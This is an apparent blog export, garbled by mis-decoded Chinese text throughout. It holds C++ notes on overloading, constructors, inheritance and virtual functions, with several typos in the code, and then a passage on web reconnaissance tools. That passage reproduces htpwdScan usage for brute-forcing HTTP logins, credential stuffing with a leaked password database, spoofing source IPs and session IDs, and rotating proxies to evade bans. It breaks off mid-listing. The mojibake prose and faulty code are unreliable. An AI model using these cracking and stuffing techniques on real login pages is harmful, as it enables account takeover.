<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">å‡½æ•°ç±»å‹ <span class="keyword">operator</span> è¿ç®—ç¬¦åç§°ï¼ˆå½¢å‚è¡¨ï¼‰</span><br><span class="line">&#123;</span><br><span class="line">	è¿ç®—ç¬¦çš„é‡è½½å¤„ç†</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ä¸èƒ½é‡è½½çš„è¿ç®—ç¬¦åªæœ‰äº”ä¸ªâ€.â€*â€::â€sizeofâ€â€?:â€</p>
<p>é‡è½½æµè¿ç®—ç¬¦</p>
<ul>
<li><p>åªèƒ½å°†æµè¿ç®—ç¬¦ä½œä¸ºå‹å…ƒ</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">//å†™åœ¨ç±»å¤–ï¼Œå¹¶ä¸”åœ¨ç±»ä¸­çš„publicä½œä¸ºå‹å…ƒå‡½æ•°</span></span><br><span class="line">ostream &amp; <span class="keyword">operator</span> &lt;&lt;(ostream &amp; output ,Complex &amp; c)<span class="comment">//å¼•ç”¨åªæ˜¯ä¸ªåˆ«å</span></span><br><span class="line">&#123;</span><br><span class="line">    output &lt;&lt;  c.real &lt;&lt; <span class="string">&quot;+&quot;</span> &lt;&lt; c.imag&lt;&lt;endl;</span><br><span class="line">    <span class="keyword">return</span> output;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
<p>ç±»å‹è½¬æ¢å‡½æ•°</p>
<ul>
<li>åªèƒ½ä½œä¸ºæˆå‘˜å‡½æ•°</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">operator</span> ç±»å‹å()</span><br><span class="line">&#123;å®ç°è½¬æ¢çš„è¯­å¥&#125;</span><br></pre></td></tr></table></figure>

<p>exampleï¼š</p>
<p>ä¸€ä¸ªæ•´æ•°å’Œä¸€ä¸ªå¤æ•°ç›´æ¥ç›¸åŠ ï¼Œè®¾å·²æœ‰å¤æ•°ç±»Complex,ç±»ä¸­æœ‰privateæœ‰realå’Œimagä¸¤ä¸ªæ•°æ®æˆå‘˜è¡¨ç¤ºå®éƒ¨å’Œè™šéƒ¨</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">//å†™åœ¨ç±»Complexä¸­çš„publicä½œä¸ºæˆå‘˜å‡½æ•°</span></span><br><span class="line"><span class="function"><span class="keyword">operator</span> <span class="title">int</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;<span class="keyword">return</span> real;&#125;</span><br></pre></td></tr></table></figure>

<p>è¿™æ ·ä¸»å‡½æ•°å°±å¯ä»¥å®ç°ï¼š</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span>  <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    Complex d,d1;</span><br><span class="line">    <span class="keyword">int</span> a=<span class="number">2</span>;</span><br><span class="line">    d1 = d + <span class="number">2</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h4 id="æ„é€ å‡½æ•°å’Œææ„å‡½æ•°"><a href="#æ„é€ å‡½æ•°å’Œææ„å‡½æ•°" class="headerlink" title="æ„é€ å‡½æ•°å’Œææ„å‡½æ•°"></a>æ„é€ å‡½æ•°å’Œææ„å‡½æ•°</h4><pre><code> 1. ç”¨æ„é€ å‡½æ•°å®ç°æ•°æ®æˆå‘˜çš„åˆå§‹åŒ–
</code></pre>
<ul>
<li><p>æ„é€ å‡½æ•°æ²¡æœ‰è¿”å›å€¼ç±»å‹ï¼Œå‡½æ•°åå’Œç±»åç›¸åŒ</p>
</li>
<li><p>æ„é€ å‡½æ•°å¯ä»¥é‡è½½ï¼Œæ—¢å¯ä»¥ä½¿ç”¨ä¸åŒçš„å‡½æ•°å‚æ•°è¿›è¡Œå¯¹è±¡çš„åˆå§‹åŒ–</p>
</li>
<li><p>æ„é€ å‡½æ•°ç”±ç¼–è¯‘å™¨è‡ªåŠ¨è°ƒç”¨è¯­å¥ï¼Œç”¨äºå¯¹è±¡æ•°æ®æˆå‘˜çš„åˆå§‹åŒ–ï¼ˆä¸éœ€è¦ä¹Ÿä¸èƒ½æ‰‹åŠ¨è°ƒç”¨ï¼‰</p>
</li>
</ul>
<hr>
<ol start="2">
<li>é»˜è®¤æ„é€ å‡½æ•°</li>
</ol>
<ul>
<li>ä½¿ç”¨é»˜è®¤æ„é€ å‡½æ•°çš„æ—¶å€™ä½¿ç”¨ <code>Classname obj</code></li>
</ul>
<hr>
<ol start="3">
<li> æ„é€ å‡½æ•°å‚æ•°è¡¨ï¼Œç±»å¤–å®šä¹‰</li>
</ol>
<ul>
<li>ä½¿ç”¨å‚æ•°è¡¨å®šä¹‰æ„é€ å‡½æ•° </li>
<li>ç”¨å‚æ•°è¡¨å¯¹æ•°æ®æˆå‘˜è¿›è¡Œåˆå§‹åŒ–</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">Box</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">public</span>:</span><br><span class="line">		<span class="built_in">Box</span> (<span class="keyword">int</span> h,<span class="keyword">int</span> w,<span class="keyword">int</span> l):<span class="built_in">height</span> (h),<span class="built_in">weight</span> (w),<span class="built_in">len</span> (l)&#123;&#125;<span class="comment">//ç”¨å‚æ•°è¡¨å¯¹æ•°æ®æˆå‘˜è¿›è¡Œåˆå§‹åŒ–</span></span><br><span class="line">	<span class="keyword">private</span>:</span><br><span class="line">		<span class="keyword">int</span> height ;</span><br><span class="line">		<span class="keyword">int</span> weight ;</span><br><span class="line">		<span class="keyword">int</span> len;</span><br><span class="line">&#125; ;<span class="comment">//åˆ†å·è®°å¾—åŠ 	</span></span><br></pre></td></tr></table></figure>

<ul>
<li>å¯ä»¥æœ‰å¤šä¸ªæ„é€ å‡½æ•°ï¼Œæ„é€ å‡½æ•°å…è®¸ç¼ºçœ</li>
</ul>
<hr>
<ol start="4">
<li>ææ„å‡½æ•°</li>
</ol>
<ul>
<li>ææ„å‡½æ•°åœ¨ç±»åå‰åŠ ä¸€ä¸ª<code>~</code></li>
<li> åœ¨ç±»é‡Œé¢åªèƒ½å®šä¹‰ä¸€ä¸ªææ„å‡½æ•°</li>
<li> æ²¡æœ‰å‚æ•°</li>
</ul>
<p>ä¾‹å¦‚<code>~ box( )ï¼› </code>å®šä¹‰åœ¨å…¬æœ‰ç±»ä¸­ï¼Œææ„å‡½æ•°åœ¨å¯¹è±¡ç”Ÿå‘½å‘¨æœŸç»“æŸæ—¶è‡ªåŠ¨è°ƒç”¨ï¼Œé‡Šæ”¾å†…å­˜ç©ºé—´</p>
<h2 id="ç»§æ‰¿ä¸æ´¾ç”Ÿ"><a href="#ç»§æ‰¿ä¸æ´¾ç”Ÿ" class="headerlink" title="ç»§æ‰¿ä¸æ´¾ç”Ÿ"></a>ç»§æ‰¿ä¸æ´¾ç”Ÿ</h2><ul>
<li><p>ç»§æ‰¿ï¼šä¸ºäº†æé«˜ç¨‹åºçš„å¯é‡ç”¨æ€§ã€‚åœ¨ä¸€ä¸ªç±»çš„åŸºç¡€ä¸Šå»ºç«‹ä¸€ä¸ªæ–°çš„ç±»ã€‚è¢«ç»§æ‰¿çš„ç±»è¢«ç§°ä¸ºåŸºç±»ï¼ˆbase classï¼‰,æ–°å»ºç«‹çš„ç±»ç§°ä¸ºæ´¾ç”Ÿç±»ï¼ˆderived classï¼‰ </p>
</li>
<li><p>one base class â€”&gt; one derived class å•ç»§æ‰¿ï¼ˆsingle inheritanceï¼‰;</p>
</li>
<li><p>one base class â€”&gt; some derived classå¤šé‡ç»§æ‰¿ï¼ˆmultiple inheritanceï¼‰ï¼›</p>
</li>
<li><p>å½¢å¼  </p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> æ´¾ç”Ÿç±»å :</span>[ç»§æ‰¿æ–¹å¼] åŸºç±»å</span><br><span class="line">&#123;</span><br><span class="line">	æ´¾ç”Ÿç±»æ–°å¢æˆå‘˜</span><br><span class="line">&#125;ï¼›</span><br></pre></td></tr></table></figure>

<p>ç»§æ‰¿æ–¹å¼ï¼špublic , private , protected .</p>
</li>
<li><p>åŸºç±»æˆå‘˜åœ¨æ´¾ç”Ÿç±»ä¸­çš„è®¿é—®å±æ€§</p>
<table>
<thead>
<tr>
<th>åœ¨åŸºç±»ä¸­çš„è®¿é—®å±æ€§</th>
<th>ç»§æ‰¿æ–¹å¼</th>
<th>åœ¨æ´¾ç”Ÿç±»ä¸­çš„è®¿é—®å±æ€§</th>
</tr>
</thead>
<tbody><tr>
<td>private</td>
<td>private/public/protected</td>
<td>å‡ä¸å¯è®¿é—®</td>
</tr>
<tr>
<td>public</td>
<td>private/public/protected</td>
<td>private/public /protected(å–æƒé™å°)</td>
</tr>
<tr>
<td>protected</td>
<td>public</td>
<td>protectedï¼ˆå–æƒé™å°ï¼‰</td>
</tr>
<tr>
<td>protected</td>
<td>private</td>
<td>privateï¼ˆå–æƒé™å°ï¼‰</td>
</tr>
<tr>
<td>protected</td>
<td>protected</td>
<td>protectedï¼ˆå–æƒé™å°ï¼‰</td>
</tr>
</tbody></table>
</li>
<li><p>æ´¾ç”Ÿç±»çš„æ„æˆ</p>
<ol>
<li>ä»åŸºç±»æ¥å—æˆå‘˜ï¼ˆå…¨éƒ¨æˆå‘˜ï¼Œä¸åŒ…æ‹¬ææ„å’Œæ„é€ ï¼‰</li>
<li>è°ƒæ•´ä»åŸºç±»æ¥å—çš„æˆå‘˜ï¼ˆè°ƒæ•´è®¿é—®å±æ€§ï¼‰</li>
<li>å£°æ˜æ´¾ç”Ÿç±»çš„å¢åŠ æˆå‘˜</li>
</ol>
</li>
<li><p>å››ç§è®¿é—®å±æ€§</p>
<ol>
<li><code>public</code>ç±»å†…ç±»å¤–éƒ½å¯ä»¥è®¿é—®</li>
<li><code>private</code>ç±»å†…å¯ä»¥è®¿é—®ç±»å¤–ä¸å¯ä»¥</li>
<li><code>protected</code>åŒprivateï¼Œä¸”åœ¨ä¸‹ä¸€å±‚çš„æ´¾ç”Ÿä¸­å¯ä»¥è®¿é—®</li>
<li><code>ä¸å¯è®¿é—®</code> ç±»å†…ç±»å¤–éƒ½ä¸å¯è®¿é—®</li>
</ol>
</li>
<li><p>æ´¾ç”Ÿç±»çš„æ„é€ å‡½æ•°</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">æ´¾ç”Ÿç±»çš„æ„é€ å‡½æ•°åï¼ˆæ€»å‚æ•°è¡¨ï¼‰: åŸºç±»æ„é€ å‡½æ•°åï¼ˆå‚æ•°è¡¨ï¼‰<span class="comment">//å‡½æ•°è°ƒç”¨ï¼Œå®å‚</span></span><br><span class="line">&#123;æ´¾ç”Ÿç±»ä¸­æ–°å¢çš„æ•°æ®æˆå‘˜åˆå§‹åŒ–è¯­å¥&#125;</span><br></pre></td></tr></table></figure></li>
<li><p>å«æœ‰å­å¯¹è±¡çš„æ„é€ å‡½æ•°</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">æ´¾ç”Ÿç±»çš„æ„é€ å‡½æ•°åï¼ˆæ€»å‚æ•°è¡¨ï¼‰: åŸºç±»æ„é€ å‡½æ•°åï¼ˆå‚æ•°è¡¨ï¼‰,å­å¯¹è±¡ï¼ˆå‚æ•°è¡¨ï¼‰<span class="comment">//å‡½æ•°è°ƒç”¨ï¼Œå®å‚</span></span><br><span class="line">&#123;æ´¾ç”Ÿç±»ä¸­æ–°å¢çš„æ•°æ®æˆå‘˜åˆå§‹åŒ–è¯­å¥&#125;</span><br></pre></td></tr></table></figure></li>
<li><p>å¤šçº§æ´¾ç”Ÿæ„é€ å‡½æ•°</p>
</li>
</ul>
<p>å¤šçº§æ´¾ç”Ÿæ„é€ å‡½æ•°åªéœ€è°ƒç”¨ç›´æ¥åŸºç±»å³å¯ã€‚</p>
<ul>
<li><p>å¤šé‡ç»§æ‰¿</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">æ´¾ç”Ÿç±»çš„æ„é€ å‡½æ•°åï¼ˆæ€»å‚æ•°è¡¨ï¼‰: åŸºç±»<span class="number">1</span>æ„é€ å‡½æ•°åï¼ˆå‚æ•°è¡¨ï¼‰,åŸºç±»<span class="number">2</span>æ„é€ å‡½æ•°å(å‚æ•°è¡¨)...</span><br><span class="line">    <span class="comment">//å‡½æ•°è°ƒç”¨ï¼Œå®å‚</span></span><br><span class="line">&#123;æ´¾ç”Ÿç±»ä¸­æ–°å¢çš„æ•°æ®æˆå‘˜åˆå§‹åŒ–è¯­å¥&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>å¤šé‡ç»§æ‰¿çš„äºŒä¹‰æ€§</li>
</ul>
<ol>
<li>ä¸¤ä¸ªåŸºç±»æœ‰åŒåæˆå‘˜ï¼ˆç”¨<code>ç±»å+ä½œç”¨åŸŸæ‹“å±•ç¬¦(::)</code>è§£å†³ï¼‰</li>
<li>ä¸¤ä¸ªåŸºç±»å’Œæ´¾ç”Ÿç±»ä¸‰è€…éƒ½æœ‰åŒåæˆå‘˜ï¼ˆåŒåè¦†ç›–ï¼Œä»…æ´¾ç”Ÿç±»ä¸­çš„èµ·ä½œç”¨ï¼‰</li>
<li>class Aï¼Œclass Bæ˜¯åŒä¸€ä¸ªåŸºç±»æ´¾ç”Ÿï¼ˆè™šåŸºç±»ï¼‰</li>
</ol>
</li>
<li><p>è™šåŸºç±»çš„åˆå§‹åŒ–ï¼ˆæ„é€ å‡½æ•°ï¼‰ </p>
<p>é—´æ¥æ´¾ç”Ÿç±»åœ¨æ„é€ å‡½æ•°ä¸­ä¹Ÿè¦å†™å‡ºï¼Ÿ</p>
</li>
<li><p>åŸºç±»å’Œæ´¾ç”Ÿç±»çš„è½¬æ¢</p>
<ol>
<li>æ´¾ç”Ÿç±»å¯¹è±¡å¯ä»¥ç»™åŸºç±»å¯¹è±¡èµ‹å€¼</li>
<li>æ´¾ç”Ÿç±»å¯¹è±¡å¯ä»¥æ›¿ä»£åŸºç±»å¯¹è±¡å‘åŸºç±»å¯¹è±¡è¿›è¡Œèµ‹å€¼æˆ–è€…åˆå§‹åŒ–</li>
</ol>
</li>
</ul>
<h3 id="è™šåŸºç±»-è§£å†³å¤šé‡ç»§æ‰¿äºŒä¹‰æ€§é—®é¢˜"><a href="#è™šåŸºç±»-è§£å†³å¤šé‡ç»§æ‰¿äºŒä¹‰æ€§é—®é¢˜" class="headerlink" title="è™šåŸºç±»(è§£å†³å¤šé‡ç»§æ‰¿äºŒä¹‰æ€§é—®é¢˜)"></a>è™šåŸºç±»(è§£å†³å¤šé‡ç»§æ‰¿äºŒä¹‰æ€§é—®é¢˜)</h3><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  </span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span>:</span><span class="keyword">virtual</span> A</span><br><span class="line">&#123;</span><br><span class="line">  	  </span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C</span>:</span><span class="keyword">virtual</span> A</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>åœ¨æ´¾ç”Ÿçš„ç±»ä¸­åŠ å…¥ä¸Šä¸€ä¸ªç±»çš„è™šåŸºç±»ç»§æ‰¿ï¼ˆvirtualï¼‰ï¼Œåˆ™ä»…éœ€è¦åœ¨æ´¾ç”Ÿç±»ä¸­æ·»åŠ è‡ªå·±çš„æ•°æ®æˆå‘˜ï¼› </p>
<h3 id="è™šå‡½æ•°"><a href="#è™šå‡½æ•°" class="headerlink" title="è™šå‡½æ•°"></a>è™šå‡½æ•°</h3><p><em><strong>å¤šæ€æ€§</strong></em>   </p>
<ol>
<li><p>é™æ€å¤šæ€ç”±å‡½æ•°é‡è½½æ¥å®ç°</p>
</li>
<li><p>è™šå‡½æ•°çš„ä½œç”¨ï¼šå¯ä»¥è¾“å‡ºåŸºç±»å’Œæ´¾ç”Ÿç±»ä¸­çš„å†…å®¹ä¸åŒçš„åŒåå‡½æ•°ã€‚ï¼ˆåŠ¨æ€å¤šæ€ï¼‰</p>
</li>
</ol>
<p>exampleï¼š</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">student</span> </span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">protected</span>:</span><br><span class="line">    	<span class="keyword">int</span> num;</span><br><span class="line">    	string name;</span><br><span class="line">    	<span class="keyword">float</span> score;</span><br><span class="line">    <span class="keyword">public</span>:</span><br><span class="line">    	<span class="built_in">student</span> (<span class="keyword">int</span> n,string na,<span class="keyword">float</span> s):<span class="built_in">num</span>(n),<span class="built_in">name</span>(na),<span class="built_in">score</span>(s)&#123;&#125;</span><br><span class="line">    	<span class="function"><span class="keyword">void</span> <span class="title">display</span><span class="params">()</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            cout &lt;&lt; num&lt;&lt;name&lt;&lt;scoreï¼›</span><br><span class="line">        &#125; </span><br><span class="line">&#125;ï¼›</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">graduate</span> :</span><span class="keyword">public</span> stduent</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">private</span>:</span><br><span class="line">		<span class="keyword">int</span> wage;</span><br><span class="line">	<span class="keyword">public</span>:</span><br><span class="line">		<span class="built_in">graduate</span> (<span class="keyword">int</span> n,stirng na,<span class="keyword">float</span> s,<span class="keyword">int</span> w):<span class="built_in">student</span>(n,na,s),<span class="built_in">wage</span>(w)&#123;&#125;</span><br><span class="line">		<span class="function"><span class="keyword">void</span> <span class="title">display</span><span class="params">()</span> <span class="comment">//virtual void display() </span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">        cout &lt;&lt; num&lt;&lt;name&lt;&lt;score&lt;&lt;wage;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">//student obj define</span></span><br><span class="line">    <span class="comment">//graduate obj define</span></span><br><span class="line">    student *pt = &amp;student obj;</span><br><span class="line">    pt-&gt;<span class="built_in">display</span>();</span><br><span class="line">    pt = &amp; granduate obj;</span><br><span class="line">    pt -&gt;<span class="built_in">dispaly</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">	å¦‚æœä¸å°†ä¸Šä¸€å¤„çš„æ³¨é‡Šå¤„æ”¹æˆæ³¨é‡Šå†…å®¹ï¼›</span></span><br><span class="line"><span class="comment">	ä¸¤ä¸ªdisplayï¼ˆï¼‰å‡åªèƒ½è¾“å‡ºâ€œnameâ€â€œscoreâ€â€œnumâ€ä¸‰ä¸ªä¿¡æ¯</span></span><br><span class="line"><span class="comment">	è‹¥åŠ ä¸Šæ”¹æˆæ³¨é‡Šå†…å®¹ï¼›</span></span><br><span class="line"><span class="comment">	mainå‡½æ•°ä¸­çš„ç¬¬ä¸€ä¸ªdisplayï¼ˆï¼‰è¾“å‡ºä¸‰ä¸ªä¿¡æ¯</span></span><br><span class="line"><span class="comment">	ç¬¬äºŒä¸ªï¼ˆæŒ‡å‘guaduateçš„ï¼‰displayå°†è¾“å‡ºå››ä¸ªä¿¡æ¯</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>
<h4 id="çº¯è™šå‡½æ•°"><a href="#çº¯è™šå‡½æ•°" class="headerlink" title="çº¯è™šå‡½æ•°"></a>çº¯è™šå‡½æ•°</h4><p>çº¯è™šå‡½æ•°ä¸€èˆ¬ç”¨äºå®šä¹‰æŠ½è±¡ç±»ï¼Œæ¯”å¦‚shapeç±»å‹ï¼Œæ´¾ç”Ÿå‡ºcircleï¼Œrectangleï¼Œtriangleã€‚</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">virtual</span> å‡½æ•°ç±»å‹ å‡½æ•°åï¼ˆï¼‰ = <span class="number">0</span>;</span><br><span class="line"><span class="comment">//&quot;= 0 &quot;ä»…ä»…æ˜¯æ ‡å¿—æ€§çš„ï¼Œå¹¶ä¸æ˜¯å€¼ç­‰äº0ï¼Œå‘ŠçŸ¥ç³»ç»Ÿæ˜¯ä¸€ä¸ªçº¯è™šå‡½æ•°</span></span><br></pre></td></tr></table></figure>











]]></content>
      <categories>
        <category>ç¼–ç¨‹è¯­è¨€</category>
      </categories>
      <tags>
        <tag>åŸºç¡€è¯­æ³•</tag>
        <tag>c++</tag>
      </tags>
  </entry>
  <entry>
    <title>Webæ‰«æå™¨-å­åŸŸæ‰«æ</title>
    <url>/2021/11/16/Web%E6%89%AB%E6%8F%8F%E5%99%A8-%E5%AD%90%E5%9F%9F%E6%89%AB%E6%8F%8F/</url>
    <content><![CDATA[<h2 id="oneforall"><a href="#oneforall" class="headerlink" title="oneforall"></a>oneforall</h2><p>ä¹‹å‰ä¹Ÿæ•´ç†è¿‡å‡ ä¸ªå­åŸŸæ‰«æçš„æ’ä»¶æˆ–è€…æ˜¯å‘½ä»¤è¡Œçš„å½¢å¼ï¼Œéƒ½æ²¡æœ‰è¿™ä¸ªå¥½ç”¨ï¼Œè®°å½•ä¸€ä¸‹è¿™ä¸ªå·¥å…·</p>
<span id="more"></span>

<p>è¿™ä¸ªå‚æ•°æ²¡æœ‰å…¶ä»–é‚£ä¹ˆç¹å¤šï¼ŒåŠ ä¹‹è¾“å‡ºä¼šè‡ªåŠ¨æ•´ç†æˆcsvæ ¼å¼æ–‡ä»¶ï¼Œæ˜“ç”¨æ€§å¾ˆé«˜</p>
<p>ç”¨æ³•ï¼š</p>
<p><code>python3 oneforall.py --target xxx.com run</code></p>
<p>è´´ä¸ªè¿è¡Œæˆªå›¾</p>
<p><img src="https://github.com/LycsHub/ImageHosting/raw/master/1637037690180-2021-11-1612:41:30.png"></p>
<h2 id="fuzzdict"><a href="#fuzzdict" class="headerlink" title="fuzzdict"></a><a href="https://github.com/TheKingOfDuck/fuzzDicts">fuzzdict</a></h2><p>ç”¨æ¥æ‰¾å­—å…¸å¸¸ç”¨çš„å­—å…¸</p>
<h2 id="å¼±å£ä»¤æ£€æŸ¥å·¥å…·"><a href="#å¼±å£ä»¤æ£€æŸ¥å·¥å…·" class="headerlink" title="å¼±å£ä»¤æ£€æŸ¥å·¥å…·"></a><a href="https://github.com/shack2/SNETCracker/releases/tag/1.0.20190715">å¼±å£ä»¤æ£€æŸ¥å·¥å…·</a></h2><p>windowså¹³å°å·¥å…·ï¼Œä¸Šä¸€ä¸ªå­—å…¸ç»“åˆä½¿ç”¨ã€‚</p>
<p><img src="https://github.com/LycsHub/ImageHosting/raw/master/1637042739317-2021-11-1614:05:39.png"></p>
<h2 id="å¼±å£ä»¤ï¼‹æ’åº“"><a href="#å¼±å£ä»¤ï¼‹æ’åº“" class="headerlink" title="å¼±å£ä»¤ï¼‹æ’åº“"></a><a href="https://github.com/lijiejie/htpwdScan">å¼±å£ä»¤ï¼‹æ’åº“</a></h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">usage: htpwdScan.py [options]</span><br><span class="line"></span><br><span class="line">* HTTP weak pass scanner. By LiJieJie *</span><br><span class="line"></span><br><span class="line">Target:</span><br><span class="line">  -u RequestURL         æŒ‡å®šç ´è§£çš„URL</span><br><span class="line">                        -u &quot;https://www.test.com/login.php&quot;</span><br><span class="line">  -f RequestFile        ä»æ–‡æœ¬æ–‡ä»¶ä¸­ï¼Œå¯¼å…¥HTTPè¯·æ±‚</span><br><span class="line">  --https               å½“ä»æ–‡ä»¶å¯¼å…¥HTTPè¯·æ±‚æ—¶ï¼Œå¼ºåˆ¶ä½¿ç”¨HTTPS</span><br><span class="line">  --get                 å¼ºåˆ¶ä½¿ç”¨HTTP GETï¼Œé»˜è®¤POST</span><br><span class="line">  --auth  [ ...]        Basic/Digest/NTLM æš´åŠ›ç ´è§£,</span><br><span class="line">                        e.g. --auth users.txt pass.txt</span><br><span class="line">                        e.g. --auth users.txt my_own_func(pass.txt)</span><br><span class="line">  --pass-first          å›ºå®šå¯†ç ä¼˜å…ˆçˆ†ç ´,å‡å°è´¦å·è¢«é”å®šå‡ ç‡</span><br><span class="line"></span><br><span class="line">Dictionary:</span><br><span class="line">  -d Param=DictFile [Param=DictFile ...]</span><br><span class="line">                        ä¸ºå‚æ•°è®¾ç½®å­—å…¸æ–‡ä»¶, æ”¯æŒäºŒæ¬¡å¤„ç†å‚æ•°å€¼</span><br><span class="line">                        e.g. -d user=users.dic pass=md5(pass.dic)</span><br><span class="line">                        é«˜çº§ç”¨æˆ·å¯è‡ªå†™pythonå‡½æ•°å¤„ç†å‚æ•°ï¼Œlib/value_process.py</span><br><span class="line">                        e.g. -d user=users.dic pass=capitalize(pass.dic)</span><br><span class="line"></span><br><span class="line">Detect:</span><br><span class="line">  --no302               302è·³è½¬ä¸æ•æ„Ÿ, é»˜è®¤æ•æ„Ÿï¼Œè§†ä¸ºç ´è§£æˆåŠŸæ ‡è®°</span><br><span class="line">  --fail Fail [Fail ...]</span><br><span class="line">                        ç ´è§£å¤±è´¥æ—¶çš„æ­£æ–‡æ ‡è®°,å¯ä»¥æ˜¯å¤šä¸ª</span><br><span class="line">                        e.g. --fail &quot;user not exist&quot; &quot;password wrong&quot;</span><br><span class="line">  --suc Suc [Suc ...]   ç ´è§£æˆåŠŸæ—¶çš„æ­£æ–‡æ ‡è®°,å¯ä»¥æ˜¯å¤šä¸ª</span><br><span class="line">                        e.g. --suc &quot;welcome,&quot; &quot;logout&quot;</span><br><span class="line">  --header-fail HeaderFail</span><br><span class="line">                        ä½äºHTTPå¤´ä¸­çš„ç ´è§£å¤±è´¥æ ‡è®°</span><br><span class="line">  --header-success HeaderSuccess</span><br><span class="line">                        ä½äºHTTPå¤´ä¸­çš„ç ´è§£æˆåŠŸæ ‡è®°</span><br><span class="line">  --retry-txt RetryText</span><br><span class="line">                        å½“è¯¥æ–‡æœ¬å‡ºç°æ—¶ï¼Œè§†ä¸ºå½“å‰è¯·æ±‚æ— æ•ˆï¼Œä¼šå†æ¬¡é‡è¯•</span><br><span class="line">                        e.g. --retry-txt=&quot;IP blocked&quot;</span><br><span class="line">  --retry-no-txt RetryNoText</span><br><span class="line">                        å½“è¯¥æ–‡æœ¬æ²¡æœ‰å‡ºç°æ—¶ï¼Œè§†ä¸ºå½“å‰è¯·æ±‚æ— æ•ˆï¼Œä¼šå†æ¬¡é‡è¯•</span><br><span class="line">                        e.g. --retry-no-txt=&quot;&lt;body&gt;&quot;</span><br><span class="line">  --retry-header RetryHeader</span><br><span class="line">                        å½“è¯¥æ–‡æœ¬å‡ºç°åœ¨HTTPå¤´æ—¶ï¼Œè§†ä¸ºå½“å‰è¯·æ±‚æ— æ•ˆï¼Œä¼šå†æ¬¡é‡è¯•</span><br><span class="line">                        e.g. --retry-header=&quot;Set-Cookie:&quot;</span><br><span class="line">  --retry-no-header RetryNoHeader</span><br><span class="line">                        å½“è¯¥æ–‡æœ¬æ²¡æœ‰å‡ºç°åœ¨HTTPå¤´æ—¶ï¼Œè§†ä¸ºå½“å‰è¯·æ±‚æ— æ•ˆï¼Œä¼šå†æ¬¡é‡è¯•</span><br><span class="line">                        e.g. --retry-no-header=&quot;HTTP/1.1 200 OK&quot;</span><br><span class="line"></span><br><span class="line">Proxy and Spoof:</span><br><span class="line">  --proxy Proxy         å‘½ä»¤è¡Œè®¾å®šè‹¥å¹²ä»£ç†æœåŠ¡å™¨</span><br><span class="line">                        e.g. --proxy=1.2.3.4:8000, 5.6.7.8:8000</span><br><span class="line">  --proxy-file ProxyFile</span><br><span class="line">                        é€šè¿‡æ–‡ä»¶å¯¼å…¥è‹¥å¹²ä»£ç†æœåŠ¡å™¨</span><br><span class="line">                        e.g. --proxy-file=proxies.txt</span><br><span class="line">  --check-proxy         æ ¡éªŒHTTPä»£ç†æœåŠ¡å™¨æ˜¯å¦å·¥ä½œæ­£å¸¸</span><br><span class="line">  --fake-ip             ä¼ªé€ HTTPå¤´ X-Forwarded-Forï¼Œå°è¯•ä¼ªé€ æºIP</span><br><span class="line">  --fake-sid FakeSID    ä¼ªé€ session ID</span><br><span class="line">  --sleep Seconds       è¯·æ±‚å®Œæˆåå»¶æ—¶Nç§’ï¼Œå‡å°è¢«æœåŠ¡å™¨å°ç¦IPçš„å‡ ç‡</span><br><span class="line"></span><br><span class="line">Database attack:</span><br><span class="line">  --database param1,parma2=file</span><br><span class="line">                        å¯¼å…¥ç¤¾å·¥åº“è¿›è¡Œæ’åº“æµ‹è¯•</span><br><span class="line">                        e.g. --database user,pass=csdn.txt</span><br><span class="line">  --regex REGEX         æŒ‰è¡Œæ­£åˆ™æå–å‚æ•°å€¼. e.g. --regex=&quot;(\S+)\s+(\S+)&quot;</span><br><span class="line"></span><br><span class="line">General:</span><br><span class="line">  -t Threads            å¹¶å‘å·¥ä½œçº¿ç¨‹ï¼Œé»˜è®¤50</span><br><span class="line">  --allow-redirect      å…è®¸Follow 30xè°ƒæ•´ï¼Œé»˜è®¤ç¦æ­¢</span><br><span class="line">  -o OutFile            è¾“å‡ºæ–‡ä»¶åã€‚ é»˜è®¤ä¸ºï¼š _proxy.servers.txt æˆ– _cracked.accounts.txt</span><br><span class="line">  --debug               